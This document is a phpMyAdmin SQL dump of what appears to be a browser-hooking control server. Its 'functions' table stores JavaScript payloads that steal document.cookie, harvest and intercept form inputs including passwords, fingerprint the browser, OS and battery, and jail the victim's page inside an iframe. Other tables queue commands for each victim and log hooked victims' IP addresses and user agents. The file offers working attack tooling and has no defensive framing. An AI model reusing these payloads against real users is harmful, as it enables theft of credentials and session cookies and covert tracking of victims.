-- phpMyAdmin SQL Dump
-- version 3.5.8.2
-- http://www.phpmyadmin.net
--
-- Host: sql110.byetcluster.com
-- Generato il: Ott 05, 2015 alle 03:55
-- Versione del server: 5.6.25-73.1
-- Versione PHP: 5.3.3

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `gungo_16720144_data`
--

-- --------------------------------------------------------

--
-- Struttura della tabella `functions`
--

CREATE TABLE IF NOT EXISTS `functions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `code` text NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=36 ;

--
-- Dump dei dati per la tabella `functions`
--

INSERT INTO `functions` (`id`, `name`, `code`) VALUES
(1, 'getCurrentUrl', 'data = document.location.href;'),
(2, 'getCookie', 'data=document.cookie;'),
(3, 'grabFormInputs', 'var kvpairs = [];\r\nvar iframe = document.getElementById("ifrm");\r\nif (iframe != null)\r\n    var doc = iframe.contentDocument;\r\nelse\r\n    var doc = document;\r\nvar forms = doc.getElementsByTagName("form");\r\nfor (var j = 0;j < forms.length;j++) {\r\n    var form = forms[j];\r\n    for ( var i = 0; i < form.elements.length; i++ ) {\r\n       var e = form.elements[i];\r\n       kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));\r\n    }\r\n}\r\ndata = kvpairs.join("&");'),
(4, 'getPlugins', 'data = JSON.stringify(navigator.plugins);'),
(5, 'getBrowserInfo', 'data = navigator.appName+" "+navigator.appCodeName+" "+navigator.appVersion;'),
(6, 'getOsCpu', 'data = navigator.platform;'),
(7, 'getNavigatorProperties', 'data="";for (var p in navigator) data+=p.toString()+";";'),
(8, 'getScreenInfo', 'data="width: "+screen.width+",height: "+screen.height+",colorDepth: "+screen.colorDepth+",pixelDepth: "+screen.pixelDepth;'),
(9, 'vibrate', 'navigator.vibrate(1000);\r\ndata=0;'),
(10, 'getMobileInfo', 'data="vendor: "+navigator.vendorSub+","+navigator.vendor+";Product: "+navigator.productSub+";Core: "+navigator.hardwareConcurrency+";maxTouchPoints: "+navigator.maxTouchPoints;'),
(11, 'getBatteryInfo', 'var Battery=function(){function s(e){n=e,i(n)}function o(t){for(var n in e.split(" "))t.addEventListener(n,s)}var e="chargingchange chargingtimechange dischargingtimechange levelchange",t=navigator.battery||navigator.mozBattery||navigator.getBattery,n=null,r=function(){},i=function(){};return self.getStatus=function(e){n==="not supported"?e(null,n):n?e(n):r=e},self.onUpdate=function(e){i=e},t instanceof Function?t.call(navigator).then(function(e){n=e,r(n),o(n)},function(){n="not supported"}):t?(n=t,o(t)):n="not supported",self}(Battery||{});\r\nBattery.getStatus(function(status, error) {\r\n  if(error) {\r\n    console.error(''Battery status is not supported'');\r\n    return;\r\n  }\r\n  data=''Level: '' + Math.floor(status.level * 100) + ''%;Charging: '' + status.charging+'';Time until charged: '' + status.chargingTime+'';Battery time left: '' + status.dischargingTime;\r\n});'),
(12, 'deregister', 'eraseCookie(''_uidk''); localStorage.clear(); data=0;'),
(13, 'iframeJail', 'document.body.innerHTML = "<div style=''padding:0;margin:0;border:none;width:100%;height:100%;position:absolute;left:0;top:0;overflow:hidden;''><iframe id=''ifrm'' onload=''window.history.replaceState(null, null, this.contentWindow.location.href);'' style=''padding:0;margin:0;border:none;width:100%;height:100%;left:0;top:0;'' src=''"+document.location.href+"''></iframe></div>"; data=''captured'';'),
(14, 'alert', 'alert(''text'');\r\ndata=0;'),
(15, 'forceClientUpdate', 'eraseCookie(''_uidku'');data=0;'),
(16, 'interceptFormsSubmit', 'var iframe = document.getElementById("ifrm");\r\nif (iframe != null)\r\n    var doc = iframe.contentDocument;\r\nelse\r\n    var doc = document;\r\nvar forms = doc.getElementsByTagName("form");\r\nfor (var j = 0;j < forms.length;j++) {\r\n    var form = forms[j];\r\n    form.onsubmit = function(){ inthandler(this); }\r\n}\r\nfunction inthandler(form) {\r\n    var kvpairs = [];\r\n    data = "form submitted! id="+form.id+"&name="+form.name+"&method="+form.method+"&action="+form.action+"&";\r\n    for ( var i = 0; i < form.elements.length; i++ ) {\r\n       var e = form.elements[i];\r\n       kvpairs.push(encodeURIComponent(e.name) + "=" + encodeURIComponent(e.value));\r\n    }\r\n    data = kvpairs.join("&");\r\n    reloadjs(uid,data);\r\n}');

-- --------------------------------------------------------

--
-- Struttura della tabella `schedules`
--

CREATE TABLE IF NOT EXISTS `schedules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `fid` int(11) NOT NULL,
  `executed` tinyint(1) NOT NULL DEFAULT '0',
  `date` datetime NOT NULL,
  `responsedate` datetime NOT NULL,
  `response` text,
  PRIMARY KEY (`id`),
  KEY `uid` (`uid`),
  KEY `fid` (`fid`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=65 ;

-- --------------------------------------------------------

--
-- Struttura della tabella `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL,
  `ip` text NOT NULL,
  `ua` text NOT NULL,
  `url` text,
  `regdate` datetime NOT NULL,
  `lastupdate` datetime NOT NULL,
  `status` tinyint(1) NOT NULL,
  `lastonline` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
